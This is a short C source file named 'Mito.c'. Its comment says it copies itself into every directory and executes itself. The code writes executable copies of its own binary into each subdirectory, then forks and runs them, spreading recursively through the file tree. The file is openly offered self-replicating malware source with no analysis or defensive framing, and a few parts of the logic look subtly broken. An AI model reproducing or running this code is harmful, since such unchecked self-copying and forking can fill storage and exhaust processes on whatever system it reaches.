/*
 * =====================================================================================
 *
 *       Filename    :  Mito.c
 *       Description :  copies itself into all directories, then executes itself
 *       Compiler    :  gcc
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/sendfile.h>

int main (int argc, char *const *argv) {
    struct dirent *dr;

    DIR *d = opendir(".");
    if (d == NULL) {
        perror("opendir");
        return 1;
    }

    int orig = open(argv[0], O_RDONLY); 
    if (orig < 0) {
        perror("open");
        return 1;
    }

    while ((dr = readdir(d)) != NULL) {
        char *n = dr->d_name;  

        if (dr->d_type == DT_DIR && strcmp(n, ".") 
                                 && strcmp(n, "..")) {
            char path[PATH_MAX] = {0};

            snprintf(path, PATH_MAX, "%s/%s", dr->d_name, argv[0]+2);
            int copy = open(path, O_CREAT | O_WRONLY, 0777); 

            if (copy < 0) {
                perror("copy open");
                return 1;
            }

            while (sendfile(copy, orig, NULL, BUFSIZ) > 0);
            close(copy);
            lseek(orig, 0, SEEK_SET);

            if (!fork()) {
                if (chdir(n) < 0) {
                    perror("chdir");
                    return 1;
                }
                int copy = open(path, O_CREAT | O_WRONLY, 0777); 
                while (sendfile(copy, orig, NULL, BUFSIZ) > 0);

                if (execve(argv[0], argv, NULL) < 0) {
                    perror("execv");
                    return 1;
                }
            }
        }
    }
    return 0;
}

